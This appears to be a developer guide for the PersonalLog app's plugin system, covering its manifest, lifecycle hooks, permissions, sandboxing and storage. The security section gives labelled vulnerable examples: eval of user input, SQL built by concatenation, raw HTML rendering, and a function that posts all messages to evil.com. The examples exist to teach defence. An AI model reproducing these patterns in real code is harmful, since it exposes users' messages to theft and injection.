# PersonalLog Plugin System

**Complete Architecture and Developer Guide**

---

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Key Concepts](#key-concepts)
4. [Plugin Manifest](#plugin-manifest)
5. [Plugin Lifecycle](#plugin-lifecycle)
6. [Permission System](#permission-system)
7. [Sandbox Security](#sandbox-security)
8. [Plugin Storage](#plugin-storage)
9. [Best Practices](#best-practices)
10. [Security Considerations](#security-considerations)

---

## Overview

The PersonalLog Plugin System is a comprehensive, production-ready plugin architecture that enables developers to extend the application's functionality through secure, isolated plugins.

### Core Features

- **Type-Safe**: Built with TypeScript strict mode
- **Secure Execution**: Web Worker-based sandboxing
- **Permission Model**: 3-state permission system (granted/denied/prompt)
- **Persistent Storage**: IndexedDB-based plugin storage (7 stores)
- **Rich API**: 45+ API functions for plugin integration
- **Multiple Types**: UI, Data, AI, Export, Import, Analytics, Automation, Theme, Feature Packs
- **Resource Limits**: CPU, memory, storage, network request controls
- **Lifecycle Management**: Install, activate, deactivate, update, uninstall

### Design Philosophy

> "Plugins extend functionality without compromising security or performance."

The plugin system follows these principles:

1. **Security First**: All plugins run in isolated sandboxes
2. **User Control**: Granular permission management
3. **Performance**: Resource limits prevent abuse
4. **Developer Friendly**: Clear APIs and comprehensive documentation
5. **Type Safety**: Full TypeScript support

---

## Architecture

### System Components

```
┌─────────────────────────────────────────────────────────────┐
│                     Plugin Manager                          │
│  (Coordinates all plugin operations)                        │
└────────┬────────────────────────────────────────────────────┘
         │
         ├── Plugin Registry (IndexedDB)
         │   ├── Manifests Store
         │   ├── Runtime States Store
         │   ├── Settings Store
         │   └── Permissions Store
         │
         ├── Plugin Loader
         │   ├── Validation
         │   ├── Code Loading
         │   └── Initialization
         │
         ├── Permission Manager
         │   ├── 3-State Permission Model
         │   ├── Request/Response Handling
         │   └── Persistence
         │
         ├── Sandbox Manager
         │   ├── Web Worker Creation
         │   ├── Resource Monitoring
         │   └── Execution Control
         │
         └── Plugin API
             ├── Conversations API
             ├── Messages API
             ├── Knowledge API
             ├── Analytics API
             ├── Settings API
             └── Storage API
```

### Data Flow

```
Plugin Installation Flow:

User → Marketplace → Plugin Loader
                       ↓
                   Validation
                       ↓
               Permission Request
                       ↓
              Plugin Storage
                       ↓
                Registry Entry

Plugin Activation Flow:

User → Plugin Manager → Permission Check
                          ↓
                      Sandbox Creation
                          ↓
                  Plugin Code Execution
                          ↓
                     onActivate Hook
                          ↓
                     Active State
```

---

## Key Concepts

### Plugin Types

| Type | Description | Example |
|------|-------------|---------|
| **UI** | Custom components, views, buttons | Custom sidebar, new page |
| **Data** | Data sources, transformers, validators | External API integration |
| **AI** | AI providers, processors, routers | Custom LLM integration |
| **Export** | Export formats, destinations | PDF export, cloud backup |
| **Import** | Import sources, parsers | CSV import, note sync |
| **Analytics** | Metrics, visualizations, aggregations | Custom dashboards |
| **Automation** | Workflows, triggers, actions | Auto-tagging, scheduled tasks |
| **Theme** | Visual appearance | Dark mode, custom colors |
| **Feature Pack** | Bundled features | Complete feature set |

### Plugin States

```
installed → loading → active → inactive → uninstalling
                                    ↑
                                    └──→ error
```

| State | Description |
|-------|-------------|
| **INSTALLED** | Plugin files present but not loaded |
| **LOADING** | Plugin is being initialized |
| **ACTIVE** | Plugin is running and functional |
| **INACTIVE** | Plugin installed but not enabled |
| **ERROR** | Plugin encountered an error |
| **UNINSTALLING** | Plugin is being removed |

### Permission Model

The 3-state permission model provides granular control:

```
┌─────────┐    request    ┌────────┐    grant    ┌─────────┐
│  PROMPT │ ─────────────→│  USER  │ ──────────→│ GRANTED │
└─────────┘               └────────┘             └─────────┘
     │                                                 ↑
     │ deny                                            │ revoke
     ↓                                                 │
┌─────────┐                                           │
│ DENIED  │ ───────────────────────────────────────────┘
└─────────┘
```

---

## Plugin Manifest

The plugin manifest (`manifest.json`) describes your plugin's metadata, capabilities, and requirements.

### Complete Manifest Structure

```json
{
  "id": "vendor-name.plugin-name",
  "name": "My Plugin",
  "description": "A comprehensive plugin description",
  "version": "1.0.0",
  "minAppVersion": "1.0.0",
  "maxAppVersion": "2.0.0",
  "author": {
    "name": "Author Name",
    "email": "author@example.com",
    "website": "https://example.com"
  },
  "license": "MIT",
  "homepage": "https://github.com/author/plugin",
  "repository": "https://github.com/author/plugin.git",
  "bugs": "https://github.com/author/plugin/issues",
  "type": ["ui"],
  "keywords": ["plugin", "feature"],
  "categories": ["productivity", "utilities"],
  "icon": "base64...",
  "screenshots": ["base64..."],
  "permissions": [
    "conversations:read",
    "messages:write"
  ],
  "optionalPermissions": [
    "analytics:write"
  ],
  "config": {
    "ui": {
      "components": [...],
      "views": [...],
      "toolbarButtons": [...]
    }
  },
  "dependencies": [
    {
      "id": "other-plugin.id",
      "version": "^1.0.0",
      "required": true
    }
  ],
  "resourceLimits": {
    "maxCpuPercent": 50,
    "maxMemoryMB": 256,
    "maxStorageMB": 100,
    "maxNetworkRequestsPerMinute": 60,
    "maxExecutionTime": 5000,
    "maxFileSizeMB": 10
  },
  "settingsSchema": {
    "apiKey": {
      "type": "string",
      "label": "API Key",
      "description": "Your API key for the service",
      "required": true
    },
    "enabled": {
      "type": "boolean",
      "label": "Enable Feature",
      "default": true
    }
  },
  "defaultSettings": {
    "apiKey": "",
    "enabled": true
  },
  "entryPoints": {
    "main": "./main.ts",
    "worker": "./worker.ts"
  },
  "contributes": {
    "commands": [...],
    "menus": [...],
    "keybindings": [...]
  }
}
```

### Manifest Fields Reference

#### Identity Fields

- **`id`** (required): Unique plugin identifier in format `vendor-name.plugin-name`
- **`name`** (required): Human-readable plugin name
- **`description`** (required): Plugin description
- **`version`** (required): Semver version string (e.g., `1.0.0`)

#### Compatibility

- **`minAppVersion`** (required): Minimum PersonalLog version
- **`maxAppVersion`** (optional): Maximum PersonalLog version

#### Author Information

- **`author`** (required): Author object with `name`, `email`, `website`
- **`license`** (optional): License identifier (e.g., `MIT`, `Apache-2.0`)
- **`homepage`** (optional): Plugin homepage URL
- **`repository`** (optional): Source repository URL
- **`bugs`** (optional): Issue tracker URL

#### Type & Classification

- **`type`** (required): Array of plugin types (see Plugin Types)
- **`keywords`** (required): Search keywords
- **`categories`** (required): Category classification
- **`icon`** (optional): Base64 or URL to plugin icon
- **`screenshots`** (optional): Array of screenshot URLs

#### Permissions

- **`permissions`** (required): Required permissions array
- **`optionalPermissions`** (optional): Optional permissions array

See [Permission System](#permission-system) for complete list.

#### Configuration

- **`config`** (optional): Type-specific configuration
- **`dependencies`** (optional): Plugin dependencies
- **`resourceLimits`** (optional): Resource constraints
- **`settingsSchema`** (optional): User settings definition
- **`defaultSettings`** (optional): Default settings values

#### Entry Points

- **`entryPoints.main`** (optional): Main plugin file
- **`entryPoints.worker`** (optional): Web Worker file
- **`entryPoints.content`** (optional): Content script file

#### Contributions

- **`contributes.commands`** (optional): Command definitions
- **`contributes.menus`** (optional): Menu additions
- **`contributes.keybindings`** (optional): Keyboard shortcuts

---

## Plugin Lifecycle

### Lifecycle Phases

```
┌──────────────┐
│  Installation │ → Validate → Store → Register
└──────────────┘
       ↓
┌──────────────┐
│   Loading    │ → Load code → Create sandbox → Initialize
└──────────────┘
       ↓
┌──────────────┐
│  Activation  │ → Check permissions → Call onActivate → Set active
└──────────────┘
       ↓
┌──────────────┐
│   Running    │ → Execute functions → Handle events → Track usage
└──────────────┘
       ↓
┌──────────────┐
│ Deactivation │ → Call onDeactivate → Cleanup → Set inactive
└──────────────┘
       ↓
┌──────────────┐
│  Uninstall   │ → Call onUninstall → Remove files → Revoke permissions
└──────────────┘
```

### Lifecycle Hooks

Plugins can implement lifecycle hooks to respond to state changes:

```typescript
// main.ts
export async function onActivate(context: PluginActivationContext) {
  // Called when plugin is activated
  context.logger.info('Plugin activated');

  // Register components
  context.api.ui.registerComponent({
    id: 'my-component',
    name: 'My Component',
    category: 'message',
    render: `() => React.createElement('div', {}, 'Hello!')`
  });
}

export async function onDeactivate(context: PluginAPIContext) {
  // Called when plugin is deactivated
  context.logger.info('Plugin deactivated');

  // Cleanup resources
  await context.storage.clear();
}

export async function onSettingsChange(
  newSettings: Record<string, any>,
  oldSettings: Record<string, any>,
  context: PluginAPIContext
) {
  // Called when settings change
  context.logger.info('Settings changed', { newSettings, oldSettings });
}

export async function onUninstall(context: PluginAPIContext) {
  // Called when plugin is uninstalled
  context.logger.info('Plugin uninstalling');

  // Clean up all data
  await context.storage.clear();
}
```

---

## Permission System

### Available Permissions

#### Core Permissions

| Permission | Description | Danger Level |
|------------|-------------|--------------|
| `conversations:read` | Read conversations | 🟢 Low |
| `conversations:write` | Create/modify conversations | 🟡 Medium |
| `conversations:delete` | Delete conversations | 🔴 High |
| `messages:read` | Read messages | 🟢 Low |
| `messages:write` | Send/modify messages | 🟡 Medium |
| `messages:delete` | Delete messages | 🔴 High |
| `knowledge:read` | Access knowledge base | 🟢 Low |
| `knowledge:write` | Modify knowledge base | 🟡 Medium |
| `knowledge:delete` | Delete knowledge entries | 🔴 High |
| `contacts:read` | Read AI contacts | 🟢 Low |
| `contacts:write` | Modify contacts | 🟡 Medium |
| `contacts:delete` | Delete contacts | 🔴 High |

#### Analytics & Settings

| Permission | Description | Danger Level |
|------------|-------------|--------------|
| `analytics:read` | Access analytics data | 🟢 Low |
| `analytics:write` | Track analytics events | 🟢 Low |
| `settings:read` | Read app settings | 🟡 Medium |
| `settings:write` | Modify app settings | 🔴 High |

#### System Permissions

| Permission | Description | Danger Level |
|------------|-------------|--------------|
| `network:request` | Make network requests | 🔴 High |
| `storage:read` | Read local storage | 🟡 Medium |
| `storage:write` | Write local storage | 🟡 Medium |
| `ui:modify` | Modify UI | 🟡 Medium |
| `notifications:show` | Show notifications | 🟢 Low |
| `system:read` | Read system info | 🟡 Medium |
| `code:execute` | Execute arbitrary code | 🔴 Critical |

### Permission Request Flow

```typescript
// In your plugin code
export async function onActivate(context: PluginActivationContext) {
  // Check permission before using
  const hasPermission = context.permissions.includes('network:request');

  if (!hasPermission) {
    // Request permission
    const result = await context.api.commands.execute('request-permission', {
      permission: 'network:request'
    });
  }

  // Now safe to make network requests
  const response = await fetch('https://api.example.com/data');
}
```

### Permission Best Practices

1. **Minimize Permissions**: Only request what you need
2. **Explain Why**: Document why each permission is needed
3. **Handle Denials**: Gracefully handle permission denials
4. **Use Optional**: Mark non-critical permissions as optional

```json
{
  "permissions": [
    "messages:read"  // Required for core functionality
  ],
  "optionalPermissions": [
    "analytics:write"  // Nice to have, but not required
  ]
}
```

---

## Sandbox Security

### Security Model

All plugins execute in isolated Web Worker sandboxes:

```
┌─────────────────────────────────────────┐
│         Main Application                │
├─────────────────────────────────────────┤
│         Sandbox Manager                 │
│  ┌───────────────┐  ┌───────────────┐  │
│  │  Plugin A     │  │  Plugin B     │  │
│  │  Web Worker   │  │  Web Worker   │  │
│  │  ┌─────────┐  │  │  ┌─────────┐  │  │
│  │  │ Plugin  │  │  │  │ Plugin  │  │  │
│  │  │  Code   │  │  │  │  Code   │  │  │
│  │  └─────────┘  │  │  └─────────┘  │  │
│  └───────────────┘  └───────────────┘  │
├─────────────────────────────────────────┤
│         Permission System               │
│  ┌───────────┐  ┌───────────┐          │
│  │ Granted   │  │ Denied    │          │
│  └───────────┘  └───────────┘          │
├─────────────────────────────────────────┤
│         Resource Limits                 │
│  CPU  │ Memory │ Network │ Storage    │
└─────────────────────────────────────────┘
```

### Resource Limits

Plugins can define resource constraints:

```json
{
  "resourceLimits": {
    "maxCpuPercent": 50,              // Max CPU usage percentage
    "maxMemoryMB": 256,                // Max memory in MB
    "maxStorageMB": 100,               // Max storage in MB
    "maxNetworkRequestsPerMinute": 60, // Max network requests/min
    "maxExecutionTime": 5000,          // Max function execution time (ms)
    "maxFileSizeMB": 10                // Max individual file size (MB)
  }
}
```

### Sandbox Capabilities

#### Allowed

- Call plugin API functions (with permission checks)
- Store data in plugin-specific storage
- Emit and listen to events
- Log messages

#### Restricted

- Direct DOM manipulation (use UI API instead)
- Network requests (requires permission)
- File system access (use storage API)
- Access to other plugins

#### Forbidden

- `eval()` and `new Function()`
- Direct access to main thread
- Access to global variables
- Dynamic imports from external URLs

---

## Plugin Storage

### Storage Architecture

The plugin system uses IndexedDB with 7 specialized stores:

```
PersonalLogPlugins Database (v2)
├── manifests          # Plugin metadata
├── states             # Runtime states
├── settings           # Plugin settings
├── permissions        # Permission states
├── plugin-files       # Plugin files
├── plugin-versions    # Version history
└── installation-logs  # Installation records
```

### Plugin-Specific Storage

Plugins have isolated storage using a prefixed key system:

```typescript
// In your plugin code
export async function onActivate(context: PluginAPIContext) {
  // Store plugin data
  await context.storage.set('userPreferences', {
    theme: 'dark',
    fontSize: 14
  });

  // Retrieve plugin data
  const preferences = await context.storage.get('userPreferences');

  // List all keys
  const keys = await context.storage.keys();
  // Returns: ['userPreferences', 'cache', ...]

  // Delete specific key
  await context.storage.delete('cache');

  // Clear all plugin data
  await context.storage.clear();
}
```

### Storage API

| Method | Description | Example |
|--------|-------------|---------|
| `get(key)` | Get value by key | `await storage.get('config')` |
| `set(key, value)` | Set value | `await storage.set('config', {...})` |
| `delete(key)` | Delete key | `await storage.delete('config')` |
| `keys()` | List all keys | `await storage.keys()` |
| `clear()` | Clear all data | `await storage.clear()` |

### Storage Best Practices

1. **Use Structured Data**: Store JSON-serializable objects
2. **Clean Up**: Remove unused data to save space
3. **Cache Wisely**: Cache expensive operations with TTL
4. **Handle Errors**: Always handle storage errors gracefully

```typescript
// Good: Structured data with error handling
try {
  const cache = await context.storage.get('cache');
  if (cache && Date.now() - cache.timestamp < 3600000) {
    return cache.data; // Valid for 1 hour
  }
} catch (error) {
  context.logger.error('Cache read failed', error);
}

// Bad: Unstructured data
await context.storage.set('data', 'random string');
```

---

## Best Practices

### Development Guidelines

#### 1. Code Organization

```typescript
// main.ts - Entry point
export async function onActivate(context: PluginActivationContext) {
  const { api, logger } = context;

  logger.info('Initializing plugin');

  // Register components
  await registerUIComponents(api);

  // Setup event listeners
  setupEventListeners(api.events);
}

// ui.ts - UI components
export async function registerUIComponents(api: PluginAPISurface) {
  api.ui.registerComponent({
    id: 'my-component',
    name: 'My Component',
    category: 'message',
    render: renderComponent
  });
}

// events.ts - Event handling
export function setupEventListeners(events: PluginEventBus) {
  events.on('message:received', handleMessage);
}
```

#### 2. Error Handling

```typescript
export async function onActivate(context: PluginActivationContext) {
  try {
    // Initialize plugin
    await initializePlugin(context);
  } catch (error) {
    context.logger.error('Plugin activation failed', error);

    // Report to analytics
    await context.api.analytics.trackEvent('plugin.error', {
      message: error.message,
      stack: error.stack
    });

    throw error; // Re-throw to fail activation
  }
}
```

#### 3. Performance Optimization

```typescript
// Use caching
const CACHE_TTL = 3600000; // 1 hour

async function fetchData(api: PluginAPISurface): Promise<any> {
  // Check cache first
  const cached = await api.storage.get('cached-data');
  if (cached && Date.now() - cached.timestamp < CACHE_TTL) {
    return cached.data;
  }

  // Fetch fresh data
  const data = await fetchFromAPI();

  // Cache result
  await api.storage.set('cached-data', {
    data,
    timestamp: Date.now()
  });

  return data;
}
```

#### 4. Permission Graceful Degradation

```typescript
export async function onActivate(context: PluginActivationContext) {
  const hasAnalytics = context.permissions.includes('analytics:write');

  if (hasAnalytics) {
    // Full functionality with analytics
    context.logger.info('Analytics enabled');
  } else {
    // Core functionality without analytics
    context.logger.info('Running without analytics');
  }

  // Provide core functionality regardless
  await setupCoreFeatures(context);
}
```

### Testing Guidelines

#### Unit Testing

```typescript
// main.test.ts
import { describe, it, expect } from 'vitest';
import { onActivate } from './main';

describe('Plugin', () => {
  it('should activate successfully', async () => {
    const mockContext = createMockContext();
    await onActivate(mockContext);
    expect(mockContext.api.ui.registerComponent).toHaveBeenCalled();
  });
});
```

#### Integration Testing

```typescript
// integration.test.ts
describe('Plugin Integration', () => {
  it('should handle message events', async () => {
    const plugin = await loadPlugin();
    await plugin.activate();

    plugin.emit('message:received', {
      id: 'msg-1',
      content: 'Hello'
    });

    expect(plugin.getMessageCount()).toBe(1);
  });
});
```

### Documentation Guidelines

#### README Structure

```markdown
# Plugin Name

Brief description

## Features
- Feature 1
- Feature 2

## Installation
Installation instructions

## Configuration
Configuration options

## Usage
Usage examples

## Permissions
Required permissions and why

## Development
Development setup

## License
License information
```

---

## Security Considerations

### Security Best Practices

#### 1. Input Validation

```typescript
// Always validate user input
function processInput(input: unknown): string {
  if (typeof input !== 'string') {
    throw new Error('Invalid input type');
  }

  if (input.length > 1000) {
    throw new Error('Input too long');
  }

  return input.trim();
}
```

#### 2. Avoid Dangerous Code

```typescript
// ❌ DON'T: Use eval
const result = eval(userInput);

// ✅ DO: Use safe alternatives
const result = JSON.parse(userInput);

// ❌ DON'T: Dynamic imports from untrusted sources
const module = await import(userURL);

// ✅ DO: Whitelist allowed imports
const allowedModules = {
  'utils': () => import('./utils')
};
if (allowedModules[moduleName]) {
  const module = await allowedModules[moduleName]();
}
```

#### 3. Secure Data Handling

```typescript
// ✅ DO: Sanitize data before storage
async function storeSettings(api: PluginAPISurface, settings: any) {
  const sanitized = {
    ...settings,
    apiKey: settings.apiKey ? '[REDACTED]' : undefined
  };

  await api.storage.set('settings', sanitized);
}

// ✅ DO: Validate permissions before operations
async function deleteMessage(api: PluginAPISurface, messageId: string) {
  if (!api.context.permissions.includes('messages:delete')) {
    throw new Error('Permission denied');
  }

  await api.messages.delete(messageId);
}
```

#### 4. Protect Against Abuse

```typescript
// Implement rate limiting
class RateLimiter {
  private requests: number[] = [];

  canMakeRequest(maxPerMinute: number): boolean {
    const now = Date.now();
    const oneMinuteAgo = now - 60000;

    // Remove old requests
    this.requests = this.requests.filter(t => t > oneMinuteAgo);

    if (this.requests.length < maxPerMinute) {
      this.requests.push(now);
      return true;
    }

    return false;
  }
}
```

### Common Vulnerabilities

#### XSS Prevention

```typescript
// ❌ VULNERABLE: Direct HTML rendering
function renderMessage(content: string) {
  return `<div>${content}</div>`;
}

// ✅ SECURE: Text content or sanitize
function renderMessage(content: string) {
  const div = document.createElement('div');
  div.textContent = content;
  return div;
}
```

#### Injection Prevention

```typescript
// ❌ VULNERABLE: String concatenation in queries
const query = `SELECT * FROM messages WHERE id = '${userInput}'`;

// ✅ SECURE: Parameterized queries
const query = 'SELECT * FROM messages WHERE id = ?';
executeQuery(query, [userInput]);
```

#### Data Exfiltration Prevention

```typescript
// ❌ VULNERABLE: No limits on data export
async function exportAllMessages(api: PluginAPISurface) {
  const messages = await api.messages.list(conversationId);
  await fetch('https://evil.com', {
    method: 'POST',
    body: JSON.stringify(messages)
  });
}

// ✅ SECURE: Limits and user consent
async function exportMessages(api: PluginAPISurface, maxCount: number) {
  const messages = await api.messages.list(conversationId);
  const limited = messages.slice(0, maxCount);

  // Ask user before sending
  const consent = await requestUserConsent(
    `Export ${limited.length} messages?`
  );

  if (consent) {
    await uploadWithConsent(limited);
  }
}
```

### Security Checklist

- [ ] All inputs validated
- [ ] No `eval()` or `new Function()`
- [ ] Permissions checked before operations
- [ ] Rate limiting implemented
- [ ] Data sanitization in place
- [ ] Error messages don't leak sensitive info
- [ ] Dependencies are up-to-date
- [ ] No hardcoded credentials
- [ ] User data encrypted at rest
- [ ] Network requests use HTTPS

---

## Additional Resources

- [Plugin Quick Start Guide](./PLUGIN_QUICK_START.md)
- [Plugin API Reference](./PLUGIN_API_REFERENCE.md)
- [Plugin Examples](./PLUGIN_EXAMPLES.md)
- [TypeScript Types](../src/lib/plugin/types.ts)
- [Architecture Diagrams](../docs/ARCHITECTURE.md)

---

**Last Updated:** 2025-01-07
**Plugin System Version:** 1.0.0
